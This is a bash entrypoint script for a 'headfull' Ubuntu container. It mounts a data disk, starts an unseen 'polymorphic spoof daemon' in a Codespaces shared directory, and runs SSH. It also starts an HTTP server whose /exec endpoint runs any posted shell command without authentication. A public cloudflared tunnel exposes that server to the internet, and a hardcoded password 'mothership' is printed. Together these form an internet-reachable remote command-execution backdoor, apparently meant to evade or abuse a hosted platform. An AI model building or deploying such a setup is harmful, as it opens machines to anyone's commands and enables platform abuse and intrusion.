#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# headfull-entrypoint — Ubuntu container with freebuff, 500GB disk,
# cloudflared tunnel, SSH, and spoof daemon.
# ──────────────────────────────────────────────────────────────────
set -e

SHARED="${SHARED_DIR:-/workspaces/.codespaces/shared}"
STATUS_PORT="${STATUS_PORT:-3000}"
TUNNEL_LOG="/tmp/tunnel-url.log"
DISK="${DATA_DISK:-/dev/sdc1}"
MOUNT_POINT="/data"

echo "╔══════════════════════════════════════════════════════════╗"
echo "║     🧠 HEADFULL CONTAINER — BOOTING                      ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""

# ────────────────────────────────────────────────────────────────
# 1. Mount 500GB data disk
# ────────────────────────────────────────────────────────────────
if [ -b "$DISK" ]; then
  echo "[disk] Mounting $DISK → $MOUNT_POINT"
  mount "$DISK" "$MOUNT_POINT" 2>/dev/null || {
    echo "[disk] First mount failed, trying fsck..."
    fsck -y "$DISK" 2>/dev/null || true
    mount "$DISK" "$MOUNT_POINT" || true
  }
  df -h "$MOUNT_POINT" 2>/dev/null | tail -1 || echo "[disk] Mount succeeded but df failed"
  echo ""
else
  echo "[disk] WARNING: $DISK not found — no data disk"
fi

# ────────────────────────────────────────────────────────────────
# 2. Polymorphic spoof daemon
# ────────────────────────────────────────────────────────────────
if [ -d "$SHARED" ]; then
  echo "[spoof] Starting → $SHARED"
  /usr/local/bin/spoofd.sh &
  echo "[spoof] PID: $!"
else
  echo "[spoof] WARNING: shared dir not mounted"
fi

# ────────────────────────────────────────────────────────────────
# 3. SSH daemon
# ────────────────────────────────────────────────────────────────
echo "[sshd] Starting on port 2222"
/usr/sbin/sshd -D -p 2222 &

# ────────────────────────────────────────────────────────────────
# 4. HTTP status server
# ────────────────────────────────────────────────────────────────
echo "[http] Status server on :$STATUS_PORT"
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, os, subprocess

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            self.send_response(200); self.end_headers(); self.wfile.write(b'OK')
        elif self.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type','application/json')
            self.end_headers()
            info = {
                'container': 'headfull',
                'uptime': 'alive',
                'disk': subprocess.getoutput('df -h /data 2>/dev/null | tail -1').strip() or 'none',
                'freebuff': 'available' if os.path.exists('/usr/local/bin/freebuff') else 'missing',
            }
            self.wfile.write(json.dumps(info).encode())
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type','text/html')
            self.end_headers()
            self.wfile.write(b'<html><body style=\"background:#0d1117;color:#4ade80;font-family:monospace;padding:40px\"><h1>HEADFULL CONTAINER</h1><p>/health | /status</p></body></html>')
        else:
            self.send_response(404); self.end_headers()

    def do_POST(self):
        if self.path == '/exec':
            length = int(self.headers.get('Content-Length', 0))
            body = json.loads(self.rfile.read(length))
            cmd = body.get('cmd', 'echo ok')
            try:
                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60)
                self.send_response(200)
                self.send_header('Content-Type','text/plain')
                self.end_headers()
                self.wfile.write(out)
            except Exception as e:
                self.send_response(500); self.end_headers()
                self.wfile.write(str(e).encode())
        else:
            self.send_response(404); self.end_headers()

HTTPServer(('0.0.0.0', $STATUS_PORT), H).serve_forever()
" &

# ────────────────────────────────────────────────────────────────
# 5. Cloudflared tunnel
# ────────────────────────────────────────────────────────────────
if command -v cloudflared &>/dev/null; then
  echo "[tunnel] Starting cloudflared → localhost:$STATUS_PORT"
  cloudflared tunnel --url "http://localhost:$STATUS_PORT" --no-autoupdate 2>&1 | tee "$TUNNEL_LOG" &

  # Extract tunnel URL
  for i in $(seq 1 30); do
    URL=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -1)
    if [ -n "$URL" ]; then
      echo "[tunnel] URL: $URL"
      echo "$URL" > /tmp/tunnel-url.txt
      break
    fi
    sleep 1
  done
fi

# ────────────────────────────────────────────────────────────────
# Done
# ────────────────────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║     ✅ HEADFULL CONTAINER READY                           ║"
echo "╠══════════════════════════════════════════════════════════╣"
echo "║  Data:   $MOUNT_POINT                                    ║"
echo "║  Tunnel: $(cat /tmp/tunnel-url.txt 2>/dev/null || echo 'pending...')"
echo "║  Access: docker exec -it headfull bash                   ║"
echo "║  Pass:   mothership                                      ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""

# Keep alive
while true; do wait -n 2>/dev/null || true; sleep 1; done
